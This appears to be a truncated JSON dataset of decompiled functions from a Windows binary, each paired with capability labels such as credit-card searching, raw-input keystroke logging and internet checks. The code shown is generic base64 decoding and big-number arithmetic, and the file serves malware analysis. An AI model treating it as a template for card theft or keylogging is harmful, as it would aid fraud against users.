{
    "00401090": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401090(uint *param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint8_t uVar8;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    char *pcVar7;\n    char cVar9;\n    uint unaff_ESI;\n    char *pcVar10;\n    char *pcVar11;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    char *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_8h = 0xf;\n    var_ch = NULL;\n    var_1ch = var_1ch & 0xffffff00;\n    fcn.004014b0(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\", 0x40);\n    iVar4 = param_1[4];\n    var_2ch = 0;\n    var_34h = 0;\n    var_30h = 0;\n    pcVar11 = var_ch;\n    if (iVar4 != 0) {\n        do {\n            iVar4 = iVar4 + -1;\n            puVar6 = param_1;\n            if (0xf < param_1[5]) {\n                puVar6 = *param_1;\n            }\n            if (*(puVar6 + var_2ch) == '=') break;\n            puVar6 = param_1;\n            if (0xf < param_1[5]) {\n                puVar6 = *param_1;\n            }\n            uVar8 = *(puVar6 + var_2ch);\n            iVar5 = fcn.004097ca(uVar8);\n            pcVar11 = var_ch;\n            if (((iVar5 == 0) && (uVar8 != 0x2b)) && (uVar8 != 0x2f)) break;\n            puVar6 = param_1;\n            if (0xf < param_1[5]) {\n                puVar6 = *param_1;\n            }\n            puVar1 = puVar6 + var_2ch;\n            var_2ch = var_2ch + 1;\n            *(&var_24h + var_34h) = *puVar1;\n            var_34h = var_34h + 1;\n            if (var_34h == 4) {\n                var_28h = 0;\n                pcVar10 = var_ch;\n                do {\n                    cVar9 = *(&var_24h + var_28h);\n                    var_20h._0_1_ = cVar9;\n                    pcVar11 = pcVar10;\n                    if ((pcVar10 != NULL) && (pcVar10 != NULL)) {\n                        puVar6 = &var_1ch;\n                        if (0xf < var_8h) {\n                            puVar6 = var_1ch;\n                        }\n                        while ((pcVar11 = var_ch,  pcVar10 != NULL &&\n                               (pcVar7 = fcn.00407610(puVar6, cVar9, pcVar10),  pcVar11 = var_ch,  pcVar7 != NULL))) {\n                            if (*pcVar7 == var_20h) {\n                                cVar9 = -0x20;\n                                if (0xf < var_8h) {\n                                    cVar9 = var_1ch;\n                                }\n                                cVar9 = pcVar7 - cVar9;\n                                goto code_r0x004011c9;\n                            }\n                            pcVar10 = puVar6 + pcVar10 + (-1 - pcVar7);\n                            puVar6 = pcVar7 + 1;\n                        }\n                    }\n                    cVar9 = -1;\ncode_r0x004011c9:\n                    *(&var_24h + var_28h) = cVar9;\n                    var_28h = var_28h + 1;\n                    pcVar10 = pcVar11;\n                } while (var_28h < 4);\n                uVar8 = var_24h >> 8;\n                *(param_2 + var_30h) = (uVar8 >> 4 & 3) + var_24h * '\\x04';\n                *(param_2 + 2 + var_30h) = var_24h._2_1_ * '@' + var_24h._3_1_;\n                *(param_2 + 1 + var_30h) = (var_24h._2_1_ >> 2 & 0xf) + uVar8 * '\\x10';\n                var_30h = var_30h + 3;\n                var_34h = 0;\n            }\n        } while (iVar4 != 0);\n        uVar3 = var_34h;\n        if (var_34h != 0) {\n            for (; uVar3 < 4; uVar3 = uVar3 + 1) {\n                if (3 < uVar3) {\n                    fcn.0040653e();\n                    goto code_r0x00401380;\n                }\n                *(&var_24h + uVar3) = 0;\n            }\n            var_2ch = 0;\n            do {\n                cVar9 = *(&var_24h + var_2ch);\n                var_20h._0_1_ = cVar9;\n                pcVar10 = pcVar11;\n                if ((pcVar11 != NULL) && (pcVar11 != NULL)) {\n                    puVar6 = &var_1ch;\n                    if (0xf < var_8h) {\n                        puVar6 = var_1ch;\n                    }\n                    while ((pcVar10 = var_ch,  pcVar11 != NULL &&\n                           (pcVar7 = fcn.00407610(puVar6, cVar9, pcVar11),  pcVar10 = var_ch,  pcVar7 != NULL))) {\n                        if (*pcVar7 == var_20h) {\n                            cVar9 = -0x20;\n                            if (0xf < var_8h) {\n                                cVar9 = var_1ch;\n                            }\n                            cVar9 = pcVar7 - cVar9;\n                            goto code_r0x004012c9;\n                        }\n                        pcVar11 = puVar6 + pcVar11 + (-1 - pcVar7);\n                        puVar6 = pcVar7 + 1;\n                    }\n                }\n                cVar9 = -1;\ncode_r0x004012c9:\n                *(&var_24h + var_2ch) = cVar9;\n                var_2ch = var_2ch + 1;\n                pcVar11 = pcVar10;\n            } while (var_2ch < 4);\n            uVar8 = var_24h >> 8;\n            var_28h._0_2_ = CONCAT11((var_24h._2_1_ >> 2 & 0xf) + uVar8 * '\\x10', (uVar8 >> 4 & 3) + var_24h * '\\x04');\n            var_28h = var_28h & 0xff000000 | var_24h._2_1_ * '@' + var_24h._3_1_ << 0x10 | var_28h;\n            if (0 < var_34h - 1) {\n                fcn.00419bb0(param_2 + var_30h, &var_28h, var_34h - 1);\n            }\n        }\n    }\n    if (var_8h < 0x10) goto code_r0x00401368;\n    puVar6 = var_1ch;\n    if (var_8h + 1 < 0x1000) {\ncode_r0x0040135f:\n        fcn.0040664d(puVar6);\ncode_r0x00401368:\n        fcn.0040640a(unaff_ESI);\n        return;\n    }\n    if ((var_1ch & 0x1f) == 0) {\n        puVar6 = var_1ch[-1];\n        if (var_1ch <= puVar6) goto code_r0x00401385;\n        if (3 < var_1ch - puVar6) {\n            if (0x23 < var_1ch - puVar6) goto code_r0x0040138f;\n            goto code_r0x0040135f;\n        }\n    }\n    else {\ncode_r0x00401380:\n        fcn.00409a00();\ncode_r0x00401385:\n        fcn.00409a00();\n    }\n    fcn.00409a00();\ncode_r0x0040138f:\n    fcn.00409a00();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2041
    },
    "00401420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401420(uint arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t **in_ECX;\n    uint32_t *puVar3;\n    \n    if ((arg_8h == '\\0') || (in_ECX[5] < 0x10)) goto code_r0x00401477;\n    puVar1 = *in_ECX;\n    if (arg_ch != NULL) {\n        fcn.00419bb0();\n    }\n    puVar3 = puVar1;\n    if (in_ECX[5] + 1U < 0x1000) {\ncode_r0x0040146d:\n        fcn.0040664d(puVar3);\ncode_r0x00401477:\n        in_ECX[5] = 0xf;\n        in_ECX[4] = arg_ch;\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        *(in_ECX + arg_ch) = 0;\n        return;\n    }\n    if ((puVar1 & 0x1f) == 0) {\n        puVar3 = puVar1[-1];\n        if (puVar1 <= puVar3) goto code_r0x00401498;\n        if (3 < puVar1 - puVar3) {\n            if (0x23 < puVar1 - puVar3) goto code_r0x004014a2;\n            goto code_r0x0040146d;\n        }\n    }\n    else {\n        fcn.00409a00();\ncode_r0x00401498:\n        fcn.00409a00();\n    }\n    fcn.00409a00();\ncode_r0x004014a2:\n    fcn.00409a00();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 430
    },
    "004021f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021f0(uint8_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    piVar4 = in_ECX + 1;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar4 = 0;\n        piVar4 = piVar4 + 1;\n    }\n    uVar3 = arg_ch & 3;\n    *in_ECX = arg_ch >> 2;\n    if (uVar3 != 0) {\n        *in_ECX = (arg_ch >> 2) + 1;\n    }\n    if (200 < *in_ECX) {\n        *in_ECX = 200;\n        arg_ch = 800;\n    }\n    piVar4 = in_ECX + 1;\n    for (iVar2 = arg_ch - 1; 2 < iVar2; iVar2 = iVar2 + -4) {\n        *piVar4 = CONCAT31(CONCAT21(CONCAT11(arg_8h[iVar2 + -3], arg_8h[iVar2 + -2]), arg_8h[iVar2 + -1]), arg_8h[iVar2]\n                          );\n        piVar4 = piVar4 + 1;\n    }\n    if (uVar3 == 1) {\n        uVar3 = *arg_8h;\n    }\n    else {\n        if (uVar3 == 2) {\n            uVar3 = *arg_8h;\n            uVar1 = arg_8h[1];\n        }\n        else {\n            if (uVar3 != 3) goto code_r0x004022aa;\n            uVar3 = CONCAT11(*arg_8h, arg_8h[1]);\n            uVar1 = arg_8h[2];\n        }\n        uVar3 = uVar3 * 0x100 + uVar1;\n    }\n    in_ECX[*in_ECX] = uVar3;\ncode_r0x004022aa:\n    iVar2 = *in_ECX;\n    while ((1 < iVar2 && (in_ECX[*in_ECX] == 0))) {\n        iVar2 = *in_ECX + -1;\n        *in_ECX = iVar2;\n    }\n    return;\n}\n",
        "token_count": 537
    },
    "004022d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022d0(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *in_EDX;\n    uint32_t *puVar6;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar2 = arg_8h;\n    piVar4 = in_ECX + 1;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *piVar4 = 0;\n        piVar4 = piVar4 + 1;\n    }\n    *in_ECX = 1;\n    arg_8h = NULL;\n    piVar4 = piVar2;\n    if (*piVar2 < *in_EDX) {\n        piVar4 = in_EDX;\n    }\n    iVar3 = *piVar4;\n    *in_ECX = iVar3;\n    if (0 < iVar3) {\n        var_14h = 0;\n        puVar6 = piVar2 + 1;\n        do {\n            uVar1 = *((in_EDX - piVar2) + puVar6);\n            uVar5 = uVar1 + *puVar6;\n            iVar3 = uVar5 + var_14h;\n            var_14h = CARRY4(uVar1, *puVar6) + CARRY4(uVar5, var_14h);\n            *(in_ECX + (-4 - piVar2) + puVar6 + 1) = iVar3;\n            arg_8h = arg_8h + 1;\n            puVar6 = puVar6 + 1;\n        } while (arg_8h < *in_ECX);\n        if ((var_14h != 0) && (*in_ECX < 200)) {\n            in_ECX[*in_ECX + 1] = var_14h;\n            *in_ECX = *in_ECX + 1;\n        }\n    }\n    iVar3 = *in_ECX;\n    while ((1 < iVar3 && (in_ECX[*in_ECX] == 0))) {\n        iVar3 = *in_ECX + -1;\n        *in_ECX = iVar3;\n    }\n    return;\n}\n",
        "token_count": 546
    },
    "00402390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402390(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *in_ECX;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t *in_EDX;\n    uint32_t *puVar7;\n    bool bVar8;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar7 = arg_8h;\n    puVar4 = in_ECX + 1;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *in_ECX = 1;\n    arg_8h = NULL;\n    puVar4 = puVar7;\n    if (*puVar7 < *in_EDX) {\n        puVar4 = in_EDX;\n    }\n    uVar2 = *puVar4;\n    *in_ECX = uVar2;\n    if (0 < uVar2) {\n        iVar3 = in_EDX - puVar7;\n        iVar5 = in_ECX - puVar7;\n        var_14h = 0;\n        do {\n            puVar7 = puVar7 + 1;\n            uVar2 = *(iVar3 + puVar7);\n            uVar6 = uVar2 - *puVar7;\n            uVar1 = -(uVar2 < *puVar7);\n            uVar2 = uVar6 < var_14h;\n            *(iVar5 + puVar7) = uVar6 - var_14h;\n            bVar8 = -1 < uVar1 - uVar2;\n            if ((uVar1 != uVar2 && bVar8) || (bVar8)) {\n                var_14h = 0;\n            }\n            else {\n                var_14h = 1;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < *in_ECX);\n        if (var_14h != 0) {\n            uVar2 = *in_ECX;\n            if (uVar2 < 200) {\n                puVar7 = in_ECX + uVar2 + 1;\n                for (iVar3 = 200 - uVar2; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar7 = 0xffffffff;\n                    puVar7 = puVar7 + 1;\n                }\n            }\n            *in_ECX = 200;\n            goto code_r0x00402461;\n        }\n    }\n    if (*in_ECX < 2) {\n        return;\n    }\ncode_r0x00402461:\n    do {\n        if (in_ECX[*in_ECX] != 0) {\n            return;\n        }\n        uVar2 = *in_ECX - 1;\n        *in_ECX = uVar2;\n    } while (1 < uVar2);\n    return;\n}\n",
        "token_count": 705
    },
    "00402510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_330h\n\nvoid __fastcall fcn.00402510(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint *puVar4;\n    int32_t var_330h;\n    uint var_32ch;\n    uint32_t auStack812 [201];\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_330h = *param_2;\n    if ((var_330h == 1) && (param_2[1] == 0)) {\n        puVar4 = &var_32ch;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        puVar3 = param_1 + 1;\n        for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *param_1 = 1;\n        iVar2 = 0;\n        puVar3 = param_1 + 1;\n        do {\n            *puVar3 = auStack812[iVar2 + -1];\n            iVar2 = iVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (iVar2 < *param_1);\n        fcn.0040640a(1);\n        return;\n    }\n    puVar4 = &var_32ch;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar2 = 0;\n    if (0 < var_330h) {\n        puVar3 = param_2 + 1;\n        do {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            auStack812[iVar2 + -1] = uVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < var_330h);\n    }\n    iVar2 = 0;\n    puVar3 = param_2 + 1;\n    do {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        auStack812[iVar2 + -1] = ~uVar1;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 200);\n    iVar2 = 0;\n    do {\n        if (199 < iVar2) break;\n        puVar3 = auStack812 + iVar2 + -1;\n        uVar1 = *puVar3;\n        *puVar3 = *puVar3 + 1;\n        iVar2 = iVar2 + 1;\n    } while (0xfffffffe < uVar1);\n    var_330h = 200;\n    do {\n        if ((&var_330h)[var_330h] != 0) break;\n        var_330h = var_330h + -1;\n    } while (1 < var_330h);\n    puVar3 = param_1 + 1;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = 0;\n    *param_1 = var_330h;\n    puVar3 = param_1 + 1;\n    if (0 < var_330h) {\n        do {\n            *puVar3 = auStack812[iVar2 + -1];\n            iVar2 = iVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (iVar2 < *param_1);\n    }\n    fcn.0040640a(var_330h);\n    return;\n}\n",
        "token_count": 921
    },
    "00402660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402660(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *in_ECX;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint32_t *puVar12;\n    uint *puVar13;\n    uint32_t *puVar14;\n    int32_t in_stack_00000324;\n    int32_t in_stack_00000328;\n    int32_t in_stack_00000648;\n    uint in_stack_fffffca8;\n    uint32_t var_350h;\n    uint var_34ch;\n    uint var_344h;\n    uint var_340h;\n    int32_t var_33ch;\n    uint var_338h;\n    int32_t var_332h;\n    uint var_32ch;\n    int32_t var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_332h._0_1_ = '\\0';\n    var_332h._1_1_ = '\\0';\n    if (in_stack_00000324 < 0) {\n        var_332h._0_1_ = '\\x01';\n        puVar6 = fcn.00402510();\n        puVar13 = &arg_8h;\n        for (iVar9 = 0xc9; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar13 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar13 = puVar13 + 1;\n        }\n    }\n    if (in_stack_00000648 < 0) {\n        var_332h._1_1_ = '\\x01';\n        puVar6 = fcn.00402510();\n        puVar13 = &stack0x00000328;\n        for (iVar9 = 0xc9; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar13 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar13 = puVar13 + 1;\n        }\n    }\n    var_33ch = 0;\n    puVar6 = &var_32ch;\n    for (iVar9 = 200; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    stack0xfffffccc = 1;\n    if (0 < arg_8h) {\n        puVar14 = &var_32ch + in_stack_00000328;\n        do {\n            uVar1 = (&arg_ch)[var_33ch];\n            if ((uVar1 != 0) && (iVar9 = 0,  0 < in_stack_00000328)) {\n                var_350h = 0;\n                puVar12 = &var_32ch + var_33ch;\n                do {\n                    iVar3 = uVar1 * *(&stack0x0000032c + iVar9 * 4);\n                    uVar7 = iVar3;\n                    uVar2 = *puVar12;\n                    uVar8 = uVar7 + *puVar12;\n                    *puVar12 = uVar8 + var_350h;\n                    var_350h = (iVar3 >> 0x20) + CARRY4(uVar7, uVar2) + CARRY4(uVar8, var_350h);\n                    iVar9 = iVar9 + 1;\n                    puVar12 = puVar12 + 1;\n                } while (iVar9 < in_stack_00000328);\n                if (var_350h != 0) {\n                    *puVar14 = var_350h;\n                }\n            }\n            var_33ch = var_33ch + 1;\n            puVar14 = puVar14 + 1;\n        } while (var_33ch < arg_8h);\n    }\n    *0x18 = in_stack_00000328 + arg_8h;\n    if (*0x18 < 0xc9) goto joined_r0x00402803;\n    stack0xfffffccc = 200;\n    do {\n        if (*(&var_332h + stack0xfffffccc * 4 + 2) != 0) break;\n        *0x18 = stack0xfffffccc + -1;\njoined_r0x00402803:\n    } while (1 < *0x18);\n    if (var_10h < 0) {\n        if (var_332h != var_332h._1_1_) {\n            if (var_10h == -0x80000000) {\n                if (stack0xfffffccc == 1) {\n                    iVar9 = 0;\n                    piVar11 = in_ECX + 1;\n                    for (iVar10 = 200; iVar10 != 0; iVar10 = iVar10 + -1) {\n                        *piVar11 = 0;\n                        piVar11 = piVar11 + 1;\n                    }\n                    *in_ECX = 1;\n                    piVar11 = in_ECX + 1;\n                    do {\n                        *piVar11 = (&var_32ch)[iVar9];\n                        iVar9 = iVar9 + 1;\n                        piVar11 = piVar11 + 1;\n                    } while (iVar9 < *in_ECX);\n                    fcn.0040640a(in_stack_fffffca8);\n                    return;\n                }\n                iVar9 = 0;\n                bVar5 = true;\n                if (stack0xfffffccc != 1 && -1 < stack0xfffffccc + -1) {\n                    do {\n                        if (!bVar5) goto code_r0x004028f5;\n                        piVar11 = &var_32ch + iVar9;\n                        iVar9 = iVar9 + 1;\n                        bVar4 = false;\n                        if (*piVar11 == 0) {\n                            bVar4 = bVar5;\n                        }\n                        bVar5 = bVar4;\n                    } while (iVar9 < stack0xfffffccc + -1);\n                    if (!bVar4) goto code_r0x004028f5;\n                }\n                piVar11 = in_ECX + 1;\n                for (iVar9 = 200; iVar9 != 0; iVar9 = iVar9 + -1) {\n                    *piVar11 = 0;\n                    piVar11 = piVar11 + 1;\n                }\n                iVar9 = 0;\n                *in_ECX = stack0xfffffccc;\n                piVar11 = in_ECX + 1;\n                if (0 < stack0xfffffccc) {\n                    do {\n                        *piVar11 = (&var_32ch)[iVar9];\n                        iVar9 = iVar9 + 1;\n                        piVar11 = piVar11 + 1;\n                    } while (iVar9 < *in_ECX);\n                    fcn.0040640a(in_stack_fffffca8);\n                    return;\n                }\n                goto code_r0x00402952;\n            }\n            goto code_r0x004028f5;\n        }\n    }\n    else {\ncode_r0x004028f5:\n        if (var_332h != var_332h._1_1_) {\n            fcn.00402510();\n            fcn.0040640a(in_stack_fffffca8);\n            return;\n        }\n    }\n    piVar11 = in_ECX + 1;\n    for (iVar9 = 200; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *piVar11 = 0;\n        piVar11 = piVar11 + 1;\n    }\n    iVar9 = 0;\n    *in_ECX = stack0xfffffccc;\n    piVar11 = in_ECX + 1;\n    if (0 < stack0xfffffccc) {\n        do {\n            *piVar11 = (&var_32ch)[iVar9];\n            iVar9 = iVar9 + 1;\n            piVar11 = piVar11 + 1;\n        } while (iVar9 < *in_ECX);\n    }\ncode_r0x00402952:\n    fcn.0040640a(in_stack_fffffca8);\n    return;\n}\n",
        "token_count": 1892
    },
    "00402a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402a80(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_8h;\n    \n    iVar5 = 0x20;\n    iVar4 = in_EDX;\n    if (1 < in_EDX) {\n        piVar1 = in_ECX + in_EDX * 4;\n        do {\n            piVar1 = piVar1 + -1;\n            if (*piVar1 != 0) break;\n            iVar4 = iVar4 + -1;\n        } while (1 < iVar4);\n    }\n    if (0 < arg_8h) {\n        do {\n            if (arg_8h < iVar5) {\n                iVar5 = arg_8h;\n            }\n            if (0 < iVar4) {\n                iVar3 = 0;\n                var_10h = 0;\n                do {\n                    uVar6 = fcn.00419ad0();\n                    uVar2 = uVar6 >> 0x20;\n                    *(in_ECX + iVar3 * 4) = uVar6 | var_10h;\n                    iVar3 = iVar3 + 1;\n                    var_10h = uVar2;\n                } while (iVar3 < iVar4);\n                if ((uVar2 != 0) && (iVar4 < in_EDX)) {\n                    *(in_ECX + iVar4 * 4) = uVar2;\n                    iVar4 = iVar4 + 1;\n                }\n            }\n            arg_8h = arg_8h - iVar5;\n        } while (0 < arg_8h);\n    }\n    return iVar4;\n}\n",
        "token_count": 446
    },
    "00402b40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402b40(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    iVar3 = 0x20;\n    var_8h = 0x20;\n    var_24h = in_EDX;\n    if (1 < in_EDX) {\n        piVar2 = in_ECX + (in_EDX + -1) * 4;\n        do {\n            var_24h = in_EDX;\n            if (*piVar2 != 0) break;\n            in_EDX = in_EDX + -1;\n            piVar2 = piVar2 + -1;\n            var_24h = in_EDX;\n        } while (1 < in_EDX);\n    }\n    if (0 < arg_8h) {\n        do {\n            if (arg_8h < iVar3) {\n                iVar3 = arg_8h;\n                var_8h = arg_8h;\n            }\n            if (-1 < var_24h + -1) {\n                var_10h = 0;\n                iVar4 = var_24h + -1;\n                do {\n                    uVar1 = fcn.00419a50();\n                    uVar1 = uVar1 | var_10h;\n                    var_10h = fcn.00419ad0();\n                    *(in_ECX + iVar4 * 4) = uVar1;\n                    iVar4 = iVar4 + -1;\n                    iVar3 = var_8h;\n                } while (-1 < iVar4);\n            }\n            arg_8h = arg_8h - iVar3;\n        } while (0 < arg_8h);\n    }\n    if (1 < var_24h) {\n        piVar2 = in_ECX + (var_24h + -1) * 4;\n        do {\n            if (*piVar2 != 0) {\n                return var_24h;\n            }\n            var_24h = var_24h + -1;\n            piVar2 = piVar2 + -1;\n        } while (1 < var_24h);\n    }\n    return var_24h;\n}\n",
        "token_count": 566
    },
    "00402c30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402c30(int32_t *param_1, int32_t *param_2)\n\n{\n    unkuint3 Var1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_1[200];\n    Var1 = iVar3 >> 8;\n    if (iVar3 < 0) {\n        if (-1 < param_2[200]) {\n            return Var1 << 8;\n        }\n        if (iVar3 < 0) goto code_r0x00402c60;\n    }\n    if (param_2[200] < 0) {\n        return CONCAT31(Var1, 1);\n    }\ncode_r0x00402c60:\n    piVar2 = param_2;\n    if (*param_2 < *param_1) {\n        piVar2 = param_1;\n    }\n    iVar3 = *piVar2 + -1;\n    if (-1 < iVar3) {\n        piVar2 = param_2 + *piVar2;\n        do {\n            if (*((param_1 - param_2) + piVar2) != *piVar2) {\n                if (iVar3 < 0) {\n                    return 0;\n                }\n                if (param_1[iVar3 + 1] < param_2[iVar3 + 1] || param_1[iVar3 + 1] == param_2[iVar3 + 1]) {\n                    return 0;\n                }\n                return 1;\n            }\n            piVar2 = piVar2 + -1;\n            iVar3 = iVar3 + -1;\n        } while (-1 < iVar3);\n    }\n    return 0;\n}\n",
        "token_count": 370
    },
    "00402cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_650h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x00402e95)\n\nvoid __cdecl fcn.00402cb0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t *extraout_ECX;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t extraout_ECX_00;\n    int32_t iVar12;\n    int32_t *extraout_EDX;\n    int32_t iVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    uint unaff_EBP;\n    uint32_t uVar16;\n    bool bVar17;\n    uint64_t uVar18;\n    uint64_t uVar19;\n    int32_t in_stack_00000328;\n    uint var_1004h;\n    uint var_1000h;\n    uint var_ffch;\n    uint var_ff8h;\n    uint var_ff4h;\n    int32_t var_ff0h;\n    